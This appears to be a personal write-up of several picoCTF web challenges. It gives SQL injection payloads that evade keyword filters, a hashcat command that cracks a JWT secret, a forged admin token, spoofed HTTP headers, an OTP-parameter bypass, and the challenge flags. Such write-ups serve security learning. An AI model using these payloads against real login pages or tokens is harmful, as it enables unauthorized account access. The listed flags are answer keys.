### **Web Gauntlet - 1**  

#### **Initial Analysis**  
We’re given a login page and need to authenticate as `admin`. The SQL query displayed after a failed login attempt:  
```sql
SELECT * FROM users WHERE username='admin' AND password='passwd'
```

#### **Round 1: Bypassing `or` Filter**  
**Filter:** `Round1: or`  
**Injection:**  
```bash
(base) harsh@Dioxie:/mnt/c/Users/Asus/OneDrive$ username: admin' -- 
```
**Result:** Bypassed by commenting out the password check.  

---

#### **Round 2: Additional Filters**  
**Filter:** `Round2: or and = like --`  
**Approach:** Used multiline comments (`/* */`) to evade space filtering.  
```bash
(base) harsh@Dioxie:/mnt/c/Users/Asus/OneDrive$ username: admin'/*
```
**Verification:** Confirmed via SQL query manipulation.  

---

#### **Round 3: Stricter Filters**  
**Filter:** `Round3: or and = like > < -- (spaces blocked)`  
**Solution:** Removed spaces and reused multiline comments:  
```bash
(base) harsh@Dioxie:/mnt/c/Users/Asus/OneDrive$ username: admin'/*
```

---

#### **Round 4: `admin` Keyword Blocked**  
**Filter:** `Round4: or and = like > < -- admin`  
**Workaround:** Used string concatenation (`||`):  
```bash
(base) harsh@Dioxie:/mnt/c/Users/Asus/OneDrive$ username: admi'||'n' --
```

---

#### **Round 5: Final Round**  
**Filter:** `Round5: or and = like > < -- union admin`  
**Injection:** Reused previous payload successfully.  

**Flag:**  
```bash
picoCTF{y0u_m4d3_1t_a5f58d5564fce237fbcc978af033c11b}
```

---

### **Web Gauntlet - 2&3**  


#### **Single-Round Challenge**  
**Filters:** `or and true false union like = > < ; -- /* */ admin`  
**Constraints:** Injection must be <35 characters.  

#### **Solution**  
```sql
SELECT username, password FROM users WHERE username='admi'||'n' AND password='a'is not 'b'
```

**Flag:**  
```bash
picoCTF{0n3_m0r3_t1m3_9605a246c21764e7691ca04679ad321a}
picoCTF{k3ep_1t_sh0rt_30593712914d76105748604617f4006a}
```

---

### **Irish Name Repo Series**  
#### **Part 1 & 2**  
**Vulnerability:** Classic SQLi.  
```bash
(base) harsh@Dioxie:/mnt/c/Users/Asus/OneDrive$ username: admin' -- 
```
**Flag:** `picoCTF{s0m3_SQL_fb3fe2ad} , picoCTF{m0R3_SQL_plz_fa983901}`  

#### **Part 3 (ROT-13 Twist)**  
**Discovery:** Password field used ROT-13 encoding.  
**Payload:** `' BE '1'='1' --` → Decoded to `' OR '1'='1' --`.  
**Flag:** `picoCTF{3v3n_m0r3_SQL_06a9db19}`  

---

### **JaWT Scratchpad**  
#### **JWT Token Exploit**  
1. Registered as `john` and intercepted JWT.  
2. Cracked secret (`ilovepico`) using Hashcat:  
```bash
(base) harsh@Dioxie:/mnt/c/Users/Asus/OneDrive$ hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt --show
```
3. Forged admin token:  
```bash
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.8gJ0ywfYjX3h6JZk7W0Qw4l5mZaXeR1n8vL2sKp3Y0
```
**Flag:** `picoCTF{jawt_was_just_what_you_thought_f859ab2f}`  

---

### **Who Are You?**  
#### **HTTP Header Manipulation**  
**Final Headers:**  
```http
GET / HTTP/1.1
Host: mercury.picoctf.net:1270
User-Agent: PicoBrowser
Referer: mercury.picoctf.net:1270
Date: Sun, 06 Nov 2018 08:49:37 GMT
DNT: 1
X-Forwarded-For: 103.69.158.255  # Swedish IP
Accept-Language: sv-SE
```
**Flag:** `picoCTF{http_h34d3rs_v3ry_c0Ol_much_w0w_f56f58a5}`  

---

### **Intro to Burp**  
#### **OTP Bypass**  
1. Registered an account.  
2. Intercepted 2FA request and removed the OTP parameter.  
**Flag:** `picoCTF{#0TP_Bypvss_SuCc3$S_c94b61ac}`  

---

### **Key Takeaways**  
- **SQLi:** Mastered evasion techniques (comments, concatenation).  
- **JWT:** Cracked secrets and forged tokens.  
- **Headers:** Manipulated HTTP headers for access control.  
- **Burp Suite:** Bypassed 2FA by parameter tampering.  
